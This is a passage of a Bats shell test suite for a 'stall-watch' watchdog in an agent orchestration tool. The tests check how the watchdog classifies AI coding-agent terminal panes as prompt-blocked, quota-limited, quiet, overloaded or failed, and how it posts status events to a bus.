  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  # --max-life 8: the single expected stalled: line must fire before the
  # top-of-loop exit; at 4 a stretched pre-sample gap could starve it (#185,
  # same as D0's fix above).
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 999 --dead 999 --max-life 8
  # The static Claude frame is not classifiable for Codex, so it falls to D0.
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "blocked|stalled: no output for 1s" ]
  run bash -c "bus | grep -c 'prompt:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: codex Hooks need review capture posts blocked/prompt:" {
  p=$(fx_codex_hooks_review)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|watchdog|prompt: interactive prompt in pane %9"* ]]
}

@test "stall-watch: codex reordered Hooks need review lines fall through to startup silence" {
  p=$(fx_codex_hooks_review_reordered)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 999 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "blocked|stalled: no output for 1s" ]
}

@test "stall-watch: a missing --engine enables no signature detector" {
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: one post per episode, then a working clearance that re-arms" {
  # GONE ends the run on sample exhaustion, not a --max-life race (#169).
  p=$(fx_prompt_trust)
  q=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$q" "$p" "$p" "$p" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 20
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 3 ]
  [[ "${lines[0]}" == blocked\|prompt:* ]]
  [ "${lines[1]}" = "working|prompt: cleared" ]
  [[ "${lines[2]}" == blocked\|prompt:* ]]
}

@test "stall-watch: a quiet: episode escalates to failed after --dead" {
  # --max-life 15 keeps the `blocked`→`failed` (+--dead 2) sequence inside the
  # run even when stretched samples push the D3 fire late (#185).
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 2 --max-life 15
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == blocked\|quiet:* ]]
  [[ "${lines[1]}" == "failed|dead: quiet: unchanged for "* ]]
}

@test "stall-watch: a clearance before --dead cancels the escalation" {
  p=$(fx_idle_box)
  q=$(fx_meter "5m 29s" "25.0k")
  # GONE ends the run on sample exhaustion, not a --max-life race (#169).
  stall_sampler "$p" "$p" "$p" "$q" "$q" "$q" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 3 --max-life 15
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'quiet: cleared' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: a prompt: episode NEVER escalates (C-1)" {
  # An unanswered answerable question is waiting work, not death. Escalating it
  # would reproduce session 3 with a 30-minute delay.
  # GONE ends the run on sample exhaustion, not a --max-life race (#169).
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 2 --max-life 20
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'prompt:' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: a prompt: episode held past --idle and --dead still never escalates or gets superseded by quiet:" {
  # C-1's real shape. A frozen prompt frame is byte-identical by construction, so
  # it satisfies D3 too — and the C-1 test above pins --idle above --max-life, so
  # it never reaches that. Here --idle and --dead are both crossed while the
  # prompt: episode is open: quiet: must not supersede it, and the timer must not
  # launder it into a failed.
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 2 --max-life 8
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'quiet:' || true"
  [ "$output" = "0" ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == blocked\|prompt:* ]]
}

@test "stall-watch: INV-W0 a — a bare-id worker terminal state mutes a suffixed watchdog" {
  CREW_ID=c1 run_crew status worker:feat/x done
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch "worker:feat/x#s1786338213-54181" --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: INV-W0 b — a suffixed-id worker terminal state mutes a bare watchdog" {
  seed_raw "worker:feat/x#s99" done "" ""
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch feat/x --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: INV-W0 c — a suffixed heartbeat damps a bare-invoked watchdog" {
  seed_raw "worker:feat/x#s99" working "" ""
  a=$(fx_meter "5m 29s" "25.0k")
  b=$(fx_meter "5m 44s" "25.0k")
  c=$(fx_meter "5m 59s" "25.0k")
  stall_sampler "$a" "$b" "$c" "$c"
  CREW_ID=c1 run run_crew stall-watch feat/x --pane %9 --engine claude \
    --grace 0 --interval 3 --window 0 --idle 3 --dead 999 --max-life 6
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: INV-W0 d — writes carry the invoking session id, roster still shows ONE row" {
  CREW_ID=c1 run_crew status worker:feat/x working
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch "worker:feat/x#s1786338213-54181" --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.body.source==\"watchdog\") | .from'"
  [ "$output" = "worker:feat/x#s1786338213-54181" ]
  CREW_ID=c1 run run_crew roster c1
  run bash -c "printf '%s' '$output' | jq 'length'"
  [ "$output" = "1" ]
}

@test "stall-watch: a bare invocation writes a bare from" {
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch feat/x --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.body.source==\"watchdog\") | .from'"
  [ "$output" = "worker:feat/x" ]
}

@test "stall-watch: a '#' branch keeps its full branch key" {
  seed_raw "worker:feat/a#zz#s2-2" done "" ""
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch "worker:feat/a#b#s1-1" --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.body.source==\"watchdog\") | .from'"
  [ "$output" = "worker:feat/a#b#s1-1" ]
}

@test "stall-watch: a watchdog steps aside once a newer session posts on its branch" {
  seed_raw "worker:feat/x#s2-2" working "" ""
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch "worker:feat/x#s1-1" --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: an older session's post does not disarm a newer watchdog" {
  seed_raw "worker:feat/x#s1-1" working "" ""
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch "worker:feat/x#s2-2" --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.body.source==\"watchdog\") | .from'"
  [ "$output" = "worker:feat/x#s2-2" ]
}

@test "stall-watch: a resumed worker's stale watchdog cannot capture a branch-only reply" {
  t=$((($(date +%s) - 60) * 1000))
  seed_start dispatch s1-1 "$t"
  seed_raw "worker:feat/x#s1-1" working "" "" "$((t + 1000))"
  seed_start resume s2-2 "$((t + 2000))"
  seed_raw "worker:feat/x#s2-2" working resumed ""
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch "worker:feat/x#s1-1" --pane %9 \
    --engine claude --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  CREW_ID=c1 run_crew reply "worker:feat/x" "resume-directive"
  run run_crew inbox "worker:feat/x#s2-2" c1
  [[ "$output" == *"resume-directive"* ]]
}

@test "stall-watch: INV-W1 — a terminal state already on the bus produces zero writes" {
  CREW_ID=c1 run_crew status worker:feat/x failed "gate red"
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'watchdog' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: INV-W3 — a second watchdog does not re-post an open episode" {
  seed_raw worker:feat/x blocked "prompt: interactive prompt in pane %9 — worker is waiting on input nobody can give" watchdog
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | grep -c 'prompt: interactive' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: C-3 — a previous run's terminal state does not mute a new watchdog" {
  seed_raw worker:feat/x failed "dead: quiet: unchanged for 1800s" watchdog "$((($(date +%s) - 3600) * 1000))"
  seed_raw worker:feat/x exited "" "" "$((($(date +%s) - 3500) * 1000))"
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | grep -c 'prompt: interactive' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: pr_open does not exit the watchdog, done does" {
  CREW_ID=c1 run_crew status worker:feat/x pr_open "" https://example.com/pr/1
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | grep -c 'prompt: interactive' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: survives 2 sample failures and exits after the 3rd" {
  p=$(fx_prompt_trust)
  stall_sampler "$p" GONE GONE "$p" "$p" "$p" GONE GONE GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 30
  [ "$status" -eq 0 ]
  # It survived the pair at samples 2-3 (the prompt confirmed on 4+5 and posted),
  # then exited on the triple rather than running to --max-life 30.
  run bash -c "bus | grep -c 'prompt: interactive' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: writes zero msg events" {
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | grep -c '\"kind\":\"msg\"' || true"
  [ "$output" = "0" ]
  CREW_ID=c1 run run_crew inbox "dispatcher:c1"
  [ -z "$output" ]
}

@test "stall-watch: rejects an unknown flag" {
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --bogus 1
  [ "$status" -eq 1 ]
  [[ "$output" == *"unknown arg"* ]]
}

@test "stall-watch: D1 posts blocked/quota: on the rate-limit prompt, not prompt:" {
  p=$(fx_prompt_quota)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|watchdog|quota: quota exhausted"* ]]
}

@test "stall-watch: a quota: episode NEVER escalates (C-1 quota variant)" {
  # Mirrors "a prompt: episode NEVER escalates (C-1)" for the quota discriminator.
  # GONE ends the run on sample exhaustion, not a --max-life race (#169).
  p=$(fx_prompt_quota)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 2 --max-life 20
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'quota:' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: a quota: episode held past --idle and --dead still never escalates or gets superseded by quiet:" {
  # Mirrors the equivalent prompt: test. A frozen quota frame is byte-identical
  # by construction, so it satisfies D3 too: quiet: must not supersede quota:,
  # and the timer must not launder it into a failed.
  p=$(fx_prompt_quota)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 2 --max-life 8
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'quiet:' || true"
  [ "$output" = "0" ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == blocked\|quota:* ]]
}

@test "stall-watch: a genuine prompt with the quota phrase far up-screen still classifies as prompt:, not quota:" {
  p=$(fx_prompt_trust_with_distant_quota_text)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == prompt:* ]]
}

@test "stall-watch: D1b posts blocked/quota: on the session-limit refusal, not quiet:" {
  p=$(fx_session_limit_refusal)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  want="blocked|watchdog|quota: session limit — do not re-dispatch; wait for the reset shown in pane %9, or a human can run /low-priority there (spends weekly budget) — Esc/Enter will not submit a queued prompt while the limit holds"
  [ "${lines[0]}" = "$want" ]
  # roster truncates detail to 120 chars, so the actionable guidance must
  # survive the cut.
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail | .[0:120]'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == *"do not re-dispatch"* ]]
}

@test "stall-watch: a session-limit quota: episode NEVER escalates" {
  # GONE ends the run on sample exhaustion, not a --max-life race (#169).
  p=$(fx_session_limit_refusal)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 2 --max-life 20
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'quota:' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: a session-limit quota: episode held past --idle and --dead still never escalates or gets superseded by quiet:" {
  # A frozen session-limit frame is byte-identical by construction, so it
  # satisfies D3 too: quiet: must not supersede quota:.
  p=$(fx_session_limit_refusal)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 2 --max-life 8
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'quiet:' || true"
  [ "$output" = "0" ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == blocked\|quota:* ]]
}

@test "stall-watch: the session-limit phrase far up-screen classifies as prompt:, not quota:" {
  p=$(fx_prompt_trust_with_distant_session_limit_text)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == prompt:* ]]
}

@test "stall-watch: D1b posts blocked/quota: on cursor's monthly usage-limit frame" {
  p=$(fx_cursor_monthly_limit)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine cursor \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|watchdog|quota: cursor monthly usage limit"* ]]
}

@test "stall-watch: a cursor monthly-limit quota: episode NEVER escalates" {
  # GONE ends the run on sample exhaustion, not a --max-life race (#169).
  p=$(fx_cursor_monthly_limit)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" GONE
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine cursor \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 2 --max-life 20
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'quota:' || true"
  [ "$output" = "1" ]
}

@test "stall-watch: cursor monthly-limit text far up-screen is not quota:" {
  p=$(fx_cursor_monthly_limit_distant)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine cursor \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'quota:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: the cursor monthly-limit frame does not quota: a claude pane" {
  # The detector is gated behind cursor's signature row, so claude never calls
  # _is_quota_cursor_limit even when the frame is on screen.
  p=$(fx_cursor_monthly_limit)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c 'quota:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D1's rate-limit quota: transitions cleanly to D1b's session-limit quota: and back" {
  q=$(fx_prompt_quota)
  s=$(fx_session_limit_refusal)
  stall_sampler "$q" "$q" "$s" "$s" "$q" "$q"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 18
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 5 ]
  [[ "${lines[0]}" == "blocked|quota: quota exhausted"* ]]
  [ "${lines[1]}" = "working|quota: cleared" ]
  [[ "${lines[2]}" == "blocked|quota: session limit"* ]]
  [ "${lines[3]}" = "working|quota: cleared" ]
  [[ "${lines[4]}" == "blocked|quota: quota exhausted"* ]]
}

@test "stall-watch: a quiet: episode with a dead engine process still escalates to failed" {
  export CREW_STALL_PROC_CMD='printf ""'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 2 --max-life 15
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == blocked\|quiet:* ]]
  [[ "${lines[1]}" == "failed|dead: quiet: unchanged for "* ]]
}

@test "stall-watch: a quiet: episode with a live engine process does NOT escalate" {
  export CREW_STALL_PROC_CMD='printf claude'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 2 --max-life 15
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == blocked\|quiet:* ]]
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D4 posts one blocked/load: once when 1m load exceeds cores for --load" {
  export CREW_STALL_LOAD_CMD='printf "99.9 32\n"'
  export CREW_STALL_TOP_CMD='printf "dispatcher/feat-187 yes 4242 99.0\n/tmp/x cc1 9999 44.0\n"'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --load 2 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|load: 1m load 99.9 on 32 cores for "*" (top: dispatcher/feat-187 yes 4242 99.0 | /tmp/x cc1 9999 44.0)" ]]
}

@test "stall-watch: D4 stays silent when the load is at or below the core count" {
  export CREW_STALL_LOAD_CMD='printf "1.0 32\n"'
  export CREW_STALL_TOP_CMD='printf ""'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --load 2 --max-life 5
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D4 ignores a transient burst shorter than --load" {
  stall_load_sampler "99.9 32" "1.0 32"
  export CREW_STALL_TOP_CMD='printf ""'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --load 5 --max-life 6
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D4 clears itself when the load drops back to the cores" {
  stall_load_sampler "99.9 32" "99.9 32" "99.9 32" "99.9 32" "99.9 32" "99.9 32" "99.9 32" "99.9 32" "1.0 32"
  export CREW_STALL_TOP_CMD='printf ""'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --load 2 --max-life 12
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == blocked\|load:* ]]
  [[ "${lines[1]}" == "working|load: cleared" ]]
}

@test "stall-watch: D4 load: is supersedable by quiet: and does not re-post stale" {
  # load: and quiet: are mutually non-sticky: a static pane lets quiet: overwrite
  # the load: detail; when load then drops, _post_clear "load:" no-ops on the
  # wrong prefix but d4_at still resets, so a later single high sample does NOT
  # re-post until the sustained --load window elapses again.
  stall_load_sampler "99.9 32" "99.9 32" "99.9 32" "99.9 32" "99.9 32" "99.9 32" "1.0 32" "99.9 32" "1.0 32"
  export CREW_STALL_TOP_CMD='printf ""'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 999 --load 2 --max-life 14
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 2 ]
  [[ "${lines[0]}" == blocked\|load:* ]]
  [[ "${lines[1]}" == blocked\|quiet:* ]]
  run bash -c "bus | grep -c 'load: cleared' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D4 stays silent on a malformed load read" {
  export CREW_STALL_LOAD_CMD='printf "garbage\n"'
  export CREW_STALL_TOP_CMD='printf ""'
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --load 2 --max-life 4
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D4 runs engine-independent (codex and no --engine)" {
  for eng in codex ""; do
    rm -f "$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
    export CREW_STALL_LOAD_CMD='printf "99.9 32\n"'
    export CREW_STALL_TOP_CMD='printf ""'
    p=$(fx_idle_box)
    stall_sampler "$p" "$p" "$p" "$p" "$p" "$p" "$p" "$p"
    if [ -n "$eng" ]; then
      CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine "$eng" \
        --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --load 2 --max-life 8
    else
      CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 \
        --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --load 2 --max-life 8
    fi
    run bash -c "bus | grep -c 'blocked' || true"
    [ "$output" = "1" ]
    run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
    [[ "$output" == load:* ]]
  done
}

# ---------------------------------------------------------------------------
# stall-watch: role mode
# ---------------------------------------------------------------------------

@test "stall-watch: role mode posts blocked/prompt: under the role id, never a worker row" {
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.from)|\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "role:feat/x:reviewer|blocked|watchdog|prompt: interactive prompt in pane %9 —"* ]]
  run bash -c "bus | grep -c '\"from\":\"worker:feat/x\"' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: role mode posts nothing for a static pane past --idle and --window" {
  p=$(fx_idle_box)
